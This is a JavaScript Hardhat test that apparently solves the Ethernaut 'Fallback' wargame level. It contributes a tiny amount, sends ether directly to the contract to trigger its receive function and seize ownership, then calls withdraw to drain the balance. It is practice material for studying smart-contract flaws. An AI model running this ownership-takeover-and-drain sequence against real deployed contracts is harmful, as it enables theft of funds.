const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { ethers, waffle } = require("hardhat");
const { createChallenge, submitLevel } = require("./utils");

const abi = [
  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
  {
    inputs: [],
    name: "contribute",
    outputs: [],
    stateMutability: "payable",
    type: "function",
    payable: true,
    signature: "0xd7bb99ba",
  },
  {
    inputs: [{ internalType: "address", name: "", type: "address" }],
    name: "contributions",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x42e94c90",
  },
  {
    inputs: [],
    name: "getContribution",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xf10fdf5c",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address payable", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x3ccfd60b",
  },
  { stateMutability: "payable", type: "receive", payable: true },
];

before(async () => {
  console.log(`running fallback test`);
  [eoa] = await ethers.getSigners();
  console.log(`eoaAddress: ${JSON.stringify(eoa)}`);
  // 0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB
  challengeAddress = createChallenge(
    `0x465f1E2c7FFDe5452CFe92aC3aa1230B76B2B1CB`
  );
  const artifact = await artifacts.readArtifact("Fallback");
  challenge = new ethers.Contract(challengeAddress, artifact.abi, eoa);
  console.log(`getting contract...`);
  // challenge = await ethers.getContractAt(abi, challengeAddress);
  console.log(`DONE!`);
});

it("solves the challenge", async () => {
  console.log(`running attempt...`);
  //Send ether less than 0.001 to contribute
  const tx = await challenge.contribute({
    from: eoa.address,
    value: ethers.utils.parseUnits("0.0000000000001", "ether"),
    gasLimit: 999999999999999,
  });
  console.log(`tings`);
  const txReceipt = await tx.wait(1);
  console.log(`txReceipt: ${JSON.stringify(txReceipt)}`);
  console.log(`playerAddress: ${JSON.stringify(eoa.address)}`);
  // Check that the contribution was added
  const dict = await challenge.contributions(eoa.address);
  console.log(`playerContributionsDict: ${JSON.stringify(dict)}`);
  const owner = await challenge.owner();
  console.log(`current owner: ${JSON.stringify(owner)}`);

  // Send ether to the fallback function
  const sendEtherTx = await eoa.sendTransaction({
    to: challengeAddress,
    value: ethers.utils.parseUnits("0.0000000000001", "ether"),
  });
  const sendEtherRt = await sendEtherTx.wait(1);
  const newOwner = await challenge.owner();
  console.log(`new owner: ${JSON.stringify(newOwner)}`);

  // Check balance before withdraw
  const oldOwnerBalanceBefore = await challenge.contributions(owner);
  console.log(
    `oldOwnerBalanceBefore: ${JSON.stringify(oldOwnerBalanceBefore)}`
  );
  const newOwnerBalanceBefore = await challenge.contributions(eoa.address);
  console.log(
    `newOwnerBalanceBefore: ${JSON.stringify(newOwnerBalanceBefore)}`
  );

  const provider = ethers.getDefaultProvider();
  const contractBalanceBefore = await provider.getBalance(challenge.address);
  console.log(
    `contractBalanceBefore: ${JSON.stringify(contractBalanceBefore)}`
  );
  // Call the withdraw function
  const withdrawTx = await challenge.withdraw();
  const withdrawRt = await withdrawTx.wait(1);

  // Check the balance after
  const oldOwnerBalanceAfter = await challenge.contributions(owner);
  console.log(`oldOwnerBalanceAfter: ${JSON.stringify(oldOwnerBalanceAfter)}`);
  const newOwnerBalanceAfter = await challenge.contributions(eoa.address);
  console.log(`newOwnerBalanceAfter: ${JSON.stringify(newOwnerBalanceAfter)}`);
  const contractBalanceAfter = await provider.getBalance(challenge.address);
  console.log(`contractBalanceAfter: ${JSON.stringify(contractBalanceAfter)}`);
  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});

module.exports.tags = ["fallback"];
